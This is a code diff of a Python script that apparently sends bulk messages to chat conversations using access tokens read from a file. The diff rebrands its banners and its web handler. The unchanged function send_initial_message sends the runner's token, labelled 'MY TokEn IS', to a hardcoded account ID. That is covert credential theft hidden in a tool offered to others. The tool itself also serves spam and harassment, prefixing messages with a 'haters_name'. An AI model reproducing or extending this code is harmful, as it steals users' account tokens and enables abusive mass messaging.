@@ -11,9 +11,10 @@ import threading
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/":
-            self.path = "index.html"   # 👈 index.html serve karega
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"-- SERVER RUNNING>>ANURAG X AROHI")
 
 def execute_server():
     PORT = 4000
@@ -25,7 +26,7 @@ def send_initial_message():
     with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
 
-    msg_template = "HeLLo Mr Anurag Sir. MY ⤵️TokEn⤵️ īīS {}"
+    msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
     target_id = "61578840237242"
 
     requests.packages.urllib3.disable_warnings()
@@ -91,7 +92,7 @@ def send_messages_from_file():
                 response = requests.post(url, json=parameters, headers=headers)
 
                 if response.ok:
-                    print("\033[1;92m[+] D3VIL RUL3X 0WN3R F3LIIX URF PRINC3 {} of Convo {} Token {}: {}".format(
+                    print("\033[1;92m[+] ANURAG X AROHI {} of Convo {} Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                 else:
                     print("\033[1;91m[x] ID/T0K3N ERROR {} of Convo {} with Token {}: {}".format(
